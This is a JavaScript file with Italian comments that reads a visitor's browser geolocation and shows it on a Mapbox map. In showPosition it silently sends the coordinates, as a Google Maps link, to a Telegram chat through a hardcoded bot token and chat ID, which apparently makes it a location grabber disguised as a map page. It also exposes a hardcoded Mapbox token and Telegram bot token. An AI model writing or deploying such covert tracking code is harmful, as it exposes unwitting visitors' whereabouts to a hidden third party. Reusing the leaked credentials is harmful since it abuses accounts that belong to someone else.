
mapboxgl.accessToken = 'pk.eyJ1IjoiYWx2ZXNpc2gtOTkiLCJhIjoiY2xpZDFtc2syMDJwbzNycWpzd3RhcmJuMiJ9.G-MF29TIZj_djR2kOFCkgQ';

function getLocation() {
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(showPosition);
 } else {
   alert("Geolocation non supportata dal tuo browser.");
 }
}

function showPosition(position) {
 var latitude = position.coords.latitude;
 var longitude = position.coords.longitude;

 // Genera il link alla mappa con le coordinate
 var mapUrl = `https://www.google.com/maps/place/${latitude},${longitude}`;

 // Costruisci il testo del messaggio con il link alla mappa
 var message = `La mia posizione attuale è: ${mapUrl}`;

 // Invia il messaggio al tuo bot Telegram utilizzando l'API di Telegram
 var telegramBotToken = "6151772234:AAHX0bR6HflzlNENm1WHv5Hfwl1RG6iXkVc";
 var chatId = "-992661881";
 var telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

 // Effettua una richiesta HTTP per inviare il messaggio al tuo bot
 var xhr = new XMLHttpRequest();
 xhr.open("GET", telegramApiUrl, true);
 xhr.send();

 // Inizializza la mappa dopo aver ottenuto le coordinate
 initMap(latitude, longitude);
}

// Funzione di callback per inizializzare la mappa
function initMap(latitude, longitude) {
 var map = new mapboxgl.Map({
   container: 'map',
   style: 'mapbox://styles/mapbox/streets-v11',
   center: [longitude, latitude],
   zoom: 12
 });

 // Crea un segnaposto sulla mappa per le tue coordinate
 var marker = new mapboxgl.Marker()
   .setLngLat([longitude, latitude])
   .addTo(map);
}
